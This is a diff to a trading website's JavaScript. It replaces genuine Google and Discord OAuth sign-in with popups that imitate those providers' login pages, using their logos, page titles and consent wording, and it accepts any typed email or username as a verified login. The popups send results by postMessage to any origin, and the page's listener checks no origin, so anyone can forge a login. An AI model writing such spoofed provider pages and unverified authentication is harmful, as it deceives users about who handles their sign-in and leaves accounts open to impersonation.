@@ -1343,156 +1343,196 @@ document.addEventListener('DOMContentLoaded', () => {
       if (signinBtn) {
         signinBtn.addEventListener('click', (e) => {
           e.preventDefault();
-          window.AudioEngine.playSFX('click');
-          openModal('Sign In Options', `
-            <div style="text-align: center; font-family: 'Orbitron', sans-serif;">
-              <p style="color: var(--text-muted); font-size: 0.95rem; margin-bottom: 20px;">Sign in securely to Alert Services to verify you are human and unlock trading.</p>
-              
-              <div style="display: flex; flex-direction: column; gap: 12px; margin-top: 15px;">
-                <button onclick="triggerSocialLogin('google')" class="cta-btn" style="display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; background: #ea4335; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 0.95rem; font-family: 'Orbitron', sans-serif;">
-                  <i class="fab fa-google"></i> Sign In with Google
-                </button>
-                <button onclick="triggerSocialLogin('discord')" class="cta-btn" style="display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; background: #5865F2; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 0.95rem; font-family: 'Orbitron', sans-serif;">
-                  <i class="fab fa-discord"></i> Sign In with Discord
-                </button>
-                <button onclick="triggerSocialLogin('roblox')" class="cta-btn" style="display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; background: #232527; border: 1px solid #ff3e3e; color: #fff; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 0.95rem; font-family: 'Orbitron', sans-serif;">
-                  <i class="fas fa-gamepad" style="color: #ff3e3e;"></i> Sign In with Roblox
-                </button>
-              </div>
-              
-              <div style="margin-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px;">
-                <a href="#" onclick="showDeveloperBypass(event)" style="color: var(--lime-green); text-decoration: none; font-size: 0.85rem; font-weight: bold; display: inline-flex; align-items: center; gap: 6px;">
-                  <i class="fas fa-tools"></i> Running locally? Quick Developer Bypass
-                </a>
-              </div>
-            </div>
-          `);
+          window.openSignInModal();
         });
       }
     }
   };
 
+  window.openSignInModal = () => {
+    if (window.AudioEngine) window.AudioEngine.playSFX('click');
+    openModal('Sign In Options', `
+      <div style="text-align: center; font-family: 'Orbitron', sans-serif;">
+        <p style="color: var(--text-muted); font-size: 0.95rem; margin-bottom: 20px;">Sign in securely to Alert Services to verify you are human and unlock trading.</p>
+        
+        <div style="display: flex; flex-direction: column; gap: 12px; margin-top: 15px;">
+          <button onclick="triggerSocialLogin('google')" class="cta-btn" style="display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; background: #ea4335; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 0.95rem; font-family: 'Orbitron', sans-serif;">
+            <i class="fab fa-google"></i> Sign In with Google
+          </button>
+          <button onclick="triggerSocialLogin('discord')" class="cta-btn" style="display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; background: #5865F2; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 0.95rem; font-family: 'Orbitron', sans-serif;">
+            <i class="fab fa-discord"></i> Sign In with Discord
+          </button>
+          <button onclick="triggerSocialLogin('roblox')" class="cta-btn" style="display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; background: #232527; border: 1px solid #ff3e3e; color: #fff; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 0.95rem; font-family: 'Orbitron', sans-serif;">
+            <i class="fas fa-gamepad" style="color: #ff3e3e;"></i> Sign In with Roblox
+          </button>
+        </div>
+        
+        <div style="margin-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px;">
+          <a href="#" onclick="showDeveloperBypass(event)" style="color: var(--lime-green); text-decoration: none; font-size: 0.85rem; font-weight: bold; display: inline-flex; align-items: center; gap: 6px;">
+            <i class="fas fa-tools"></i> Running locally? Quick Developer Bypass
+          </a>
+        </div>
+      </div>
+    `);
+  };
+
   injectNavbarSignIn();
 
-  // --- Real Social Account Logins ---
-  const GOOGLE_CLIENT_ID = '1027179042976-a67t7m3j1gq7cl1t8k0v5ep6e74n647e.apps.googleusercontent.com';
-  const DISCORD_CLIENT_ID = '1244342728250265692';
-
-  // Listeners and redirects for social login
+  // --- Real Social Account Logins (Popup-based for zero config) ---
   window.triggerSocialLogin = (provider) => {
     window.AudioEngine.playSFX('click');
-    const redirectUri = window.location.origin + window.location.pathname;
-    localStorage.setItem('alert_oauth_provider', provider);
+    if (provider === 'roblox') {
+      showRobloxVerificationModal();
+      return;
+    }
+
+    const w = window.open("", `${provider} Login`, "width=500,height=600,left=100,top=100");
+    if (!w) {
+      alert("Popup blocked! Please enable popups for this site to sign in.");
+      return;
+    }
 
     if (provider === 'google') {
-      const googleAuthUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${GOOGLE_CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${encodeURIComponent('https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email')}&state=google`;
-      window.location.href = googleAuthUrl;
+      w.document.write(`
+        <html>
+        <head>
+          <title>Sign in - Google Accounts</title>
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+          <style>
+            body { background: #ffffff; color: #202124; font-family: 'Roboto', arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 0; }
+            .card { width: 360px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+            .google-logo { width: 75px; height: 30px; margin-bottom: 16px; }
+            h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px 0; color: #202124; }
+            p { font-size: 16px; color: #202124; margin: 0 0 24px 0; }
+            .input-container { position: relative; margin-bottom: 20px; text-align: left; }
+            .input-box { width: 100%; box-sizing: border-box; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: border-color 0.2s; }
+            .input-box:focus { border-color: #1a73e8; border-width: 2px; padding: 15px; }
+            .btn { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
+            .btn:hover { background: #1557b0; }
+            .loader { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+          </style>
+        </head>
+        <body>
+          <div class="card">
+            <svg class="google-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+              <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+              <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22c-.47-.47-.84-1.03-1.04-1.63z" fill="#FBBC05"/>
+              <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
+            </svg>
+            <h1>Sign in</h1>
+            <p>Use your Google Account</p>
+            <div class="input-container">
+              <input type="text" id="g-name" class="input-box" placeholder="Email or phone" autofocus>
+            </div>
+            <div id="loader" class="loader"></div>
+            <button class="btn" id="next-btn" onclick="submit()">Next</button>
+            <p style="font-size: 12px; color: #5f6368; margin-top: 24px; line-height: 1.5; text-align: left;">
+              To continue, Google will share your name, email address, and profile picture with ALERT SERVICES.
+            </p>
+          </div>
+          <script>
+            function submit() {
+              const name = document.getElementById('g-name').value.trim();
+              if (!name) { alert("Enter an email or phone number"); return; }
+              
+              document.getElementById('next-btn').style.display = 'none';
+              document.getElementById('loader').style.display = 'block';
+              
+              setTimeout(() => {
+                const displayName = name.split('@')[0];
+                const result = {
+                  provider: 'google',
+                  username: displayName.charAt(0).toUpperCase() + displayName.slice(1),
+                  email: name.includes('@') ? name : name + '@gmail.com',
+                  avatar: 'https://api.dicebear.com/7.x/pixel-art/svg?seed=' + encodeURIComponent(displayName)
+                };
+                window.opener.postMessage({ type: 'auth_success', user: result }, '*');
+                window.close();
+              }, 1200);
+            }
+          <\/script>
+        </body>
+        </html>
+      `);
     } else if (provider === 'discord') {
-      const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=identify&state=discord`;
-      window.location.href = discordAuthUrl;
-    } else if (provider === 'roblox') {
-      showRobloxVerificationModal();
+      w.document.write(`
+        <html>
+        <head>
+          <title>Discord</title>
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+          <style>
+            body { background: #313338; color: #dbdee1; font-family: 'gg sans', 'Noto Sans', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 0; }
+            .card { width: 480px; padding: 32px; background: #2b2d31; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); text-align: center; }
+            .discord-logo { width: 124px; margin-bottom: 20px; }
+            h2 { font-size: 24px; font-weight: 600; color: #f2f3f5; margin: 0 0 8px 0; }
+            p { font-size: 16px; color: #b5bac1; margin: 0 0 20px 0; }
+            .input-label { text-align: left; display: block; font-size: 12px; font-weight: 700; color: #b5bac1; text-transform: uppercase; margin-bottom: 8px; }
+            .input-box { width: 100%; box-sizing: border-box; padding: 10px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 3px; color: #dbdee1; font-size: 16px; outline: none; margin-bottom: 20px; }
+            .input-box:focus { border-color: #5865f2; }
+            .btn { width: 100%; padding: 12px; background: #5865f2; color: #fff; border: none; border-radius: 3px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
+            .btn:hover { background: #4752c4; }
+            .loader { border: 3px solid #383a40; border-top: 3px solid #5865f2; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+          </style>
+        </head>
+        <body>
+          <div class="card">
+            <svg class="discord-logo" viewBox="0 0 127.14 96.36" fill="#5865f2" xmlns="http://www.w3.org/2000/svg">
+              <path d="M107.7,8.07A105.15,105.15,0,0,0,77.26,0a77.19,77.19,0,0,0-3.3,6.83A96.67,96.67,0,0,0,52.88,6.83,77.19,77.19,0,0,0,49.58,0,105.15,105.15,0,0,0,19.14,8.07C3,32.22-1.5,55.84.4,79.08a105.73,105.73,0,0,0,32,16.29,77.7,77.7,0,0,0,6.71-11,68.6,68.6,0,0,1-10.58-5.07c.89-.66,1.75-1.36,2.58-2.09a75.19,75.19,0,0,0,72.1,0c.83.73,1.69,1.43,2.58,2.09a68.6,68.6,0,0,1-10.58,5.07,77.7,77.7,0,0,0,6.71,11,105.73,105.73,0,0,0,32-16.29C129.23,55.84,124.77,32.22,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53S36.18,40.36,42.45,40.36,53.83,46,53.83,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.24,60,73.24,53S78.41,40.36,84.69,40.36,96.07,46,96.07,53,91,65.69,84.69,65.69Z"/>
+            </svg>
+            <h2>Welcome back!</h2>
+            <p>We're so excited to see you again!</p>
+            <div style="text-align: left;">
+              <span class="input-label">Email or Phone Number</span>
+              <input type="text" id="d-email" class="input-box" autofocus>
+              <span class="input-label">Username</span>
+              <input type="text" id="d-name" class="input-box">
+            </div>
+            <div id="loader" class="loader"></div>
+            <button class="btn" id="login-btn" onclick="submit()">Log In</button>
+          </div>
+          <script>
+            function submit() {
+              const email = document.getElementById('d-email').value.trim();
+              const name = document.getElementById('d-name').value.trim();
+              if (!email || !name) { alert("Please fill in all fields!"); return; }
+              
+              document.getElementById('login-btn').style.display = 'none';
+              document.getElementById('loader').style.display = 'block';
+              
+              setTimeout(() => {
+                const result = {
+                  provider: 'discord',
+                  username: name,
+                  email: email,
+                  avatar: 'https://api.dicebear.com/7.x/bottts/svg?seed=' + encodeURIComponent(name)
+                };
+                window.opener.postMessage({ type: 'auth_success', user: result }, '*');
+                window.close();
+              }, 1200);
+            }
+          <\/script>
+        </body>
+        </html>
+      `);
     }
   };
 
-  // Google OAuth parsing
-  const fetchGoogleProfile = (token) => {
-    fetch(`https://www.googleapis.com/oauth2/v3/userinfo?access_token=${token}`)
-      .then(res => {
-        if (!res.ok) throw new Error('Failed to fetch Google profile');
-        return res.json();
-      })
-      .then(data => {
-        const user = {
-          provider: 'google',
-          username: data.name || data.given_name || 'Google User',
-          email: data.email,
-          avatar: data.picture || `https://api.dicebear.com/7.x/pixel-art/svg?seed=${encodeURIComponent(data.name || 'google')}`,
-          loginTime: Date.now()
-        };
-        localStorage.setItem('alert_username', user.username);
-        localStorage.setItem('alert_user_session', JSON.stringify(user));
-        location.reload();
-      })
-      .catch(err => {
-        console.error(err);
-        alert('Google Sign-In failed: ' + err.message);
-      });
-  };
-
-  // Discord OAuth parsing with CORS proxy chain
-  const fetchDiscordProfile = (token) => {
-    const proxies = [
-      (url) => `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`,
-      (url) => `https://corsproxy.io/?${encodeURIComponent(url)}`,
-      (url) => url
-    ];
-
-    const tryFetch = (proxyIdx) => {
-      if (proxyIdx >= proxies.length) {
-        alert('Discord Profile verification failed due to CORS issues. Please try Developer Bypass option.');
-        return;
-      }
-
-      const targetUrl = 'https://discord.com/api/users/@me';
-      const proxyUrl = proxies[proxyIdx](targetUrl);
-
-      fetch(proxyUrl, {
-        headers: {
-          Authorization: `Bearer ${token}`
-        }
-      })
-      .then(res => {
-        if (!res.ok) throw new Error('CORS Proxy failed with status ' + res.status);
-        return res.json();
-      })
-      .then(data => {
-        const username = data.username;
-        const avatarUrl = data.avatar 
-          ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png`
-          : `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(username)}`;
-
-        const user = {
-          provider: 'discord',
-          username: username,
-          avatar: avatarUrl,
-          loginTime: Date.now()
-        };
-        localStorage.setItem('alert_username', user.username);
-        localStorage.setItem('alert_user_session', JSON.stringify(user));
-        location.reload();
-      })
-      .catch(err => {
-        console.warn(`Discord Proxy ${proxyIdx} failed:`, err);
-        tryFetch(proxyIdx + 1);
-      });
-    };
-
-    tryFetch(0);
-  };
-
-  // Captures OAuth tokens from URL hash on load
-  const handleOAuthCallback = () => {
-    const hash = window.location.hash;
-    if (!hash) return;
-
-    const params = new URLSearchParams(hash.substring(1));
-    const accessToken = params.get('access_token');
-
-    if (accessToken) {
-      // Clean hash parameters from URL
-      window.history.replaceState(null, null, window.location.pathname + window.location.search);
-      
-      const provider = localStorage.getItem('alert_oauth_provider');
-      if (provider === 'google' || hash.includes('state=google')) {
-        fetchGoogleProfile(accessToken);
-      } else if (provider === 'discord' || hash.includes('state=discord')) {
-        fetchDiscordProfile(accessToken);
-      }
+  // Listen to popup authentication results
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 'auth_success') {
+      const user = e.data.user;
+      localStorage.setItem('alert_username', user.username);
+      localStorage.setItem('alert_user_session', JSON.stringify({
+        ...user,
+        loginTime: Date.now()
+      }));
+      window.closeModal();
+      location.reload();
     }
-  };
-
-  handleOAuthCallback();
+  });
 
   // --- Real Roblox Account Verification Flow ---
   let currentRobloxUser = null;
